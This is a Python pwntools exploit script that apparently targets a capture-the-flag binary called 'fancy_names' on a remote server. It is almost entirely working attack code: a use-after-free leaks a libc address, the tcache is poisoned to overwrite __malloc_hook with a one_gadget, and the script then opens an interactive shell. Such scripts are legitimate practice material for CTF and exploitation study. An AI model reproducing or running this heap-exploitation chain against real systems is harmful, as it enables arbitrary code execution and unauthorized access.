#!/usr/bin/python3

from pwn import *

exe = ELF("fancy_names", checksec=False)
libc = ELF("./.glibc/libc.so.6", checksec=False)
ld = ELF("./.glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '59', '-I']
context.log_level 	= "WARNING"
isDebug = False

gs = '''
brva 0x0000000000001EF2
brva 0x0000000000001CB9
brva 0x0000000000001DA7
brva 0x000000000000228A
brva 0x0000000000001DC9
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path])
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def exploit():
	# free secondMalloc (look in IDA to see variable names)
	io.sendlineafter(b"> ", b"2")
	io.sendlineafter(b"> ", b"9")
	io.sendlineafter(b"> ", b"1")

	# leak libc
	payload = b"w" * 55 
	io.sendlineafter(b"name (minimum 5 chars): ", payload)
	data = io.recv()
	split1 = data.split(b'\n')
	split_data = split1[2]
	address = unpack(split_data.rstrip(), 'all', endian='little')
	hex_address = hex(address)
	libc_base = address - 0x64f44
	libc.address = libc_base
	print(f"Leaked address1: {hex_address}")
	print(f"Libc's base: {hex(libc_base)}")
	io.sendline(b"n")

	# now that we leaked libc c, lets use UAF on secondMalloc and overwrite its fd field with the address of __malloc_hook
	io.sendlineafter(b"> ", b"1")
	malloc_hook_address = libc.sym['__malloc_hook']

	# Modify the address because the last byte gets set to 0x00. We lose 0x7f of the address.
	# So we add another "garbage" byte so it gets set to 0x00 and not 0x7f.
	modified_address = malloc_hook_address & 0xFFFFFFFFFF  # Keep the lower 5 bytes
	modified_address |= (0x227f << 40)  # Add 0x227f after the 5 bytes
	payload = p64(modified_address, endian='little')
	io.sendlineafter(b"name (minimum 5 chars): ", payload)
	io.sendlineafter(b": ", b"y")

	# continue...
	io.sendlineafter(b"> ", b"3")

	# malloc garbage - remove firstMalloc from tcachebin
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b": ", f"{0x68}".encode())
	io.sendlineafter(b": ", b"b")

	# another garbage malloc - remove secondMalloc from tcachebin
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b": ", f"{0x68}".encode())
	io.sendlineafter(b": ", b'b')

	# malloc the last item in the tcachebin which is __malloc_hook we set via secondMalloc's fd field. Set __malloc_hook value to one_gadget.
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b": ", f"{0x68}".encode())

	payload = flat(
		libc.address + 0x10a41c
	)

	io.sendlineafter(b": ", payload)

	# malloc last time for the win
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b": ", f"{0x68}".encode())
	

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
io = remote("188.166.175.58", 32389)
# io = start_local(isDebug)

exploit()

io.interactive()

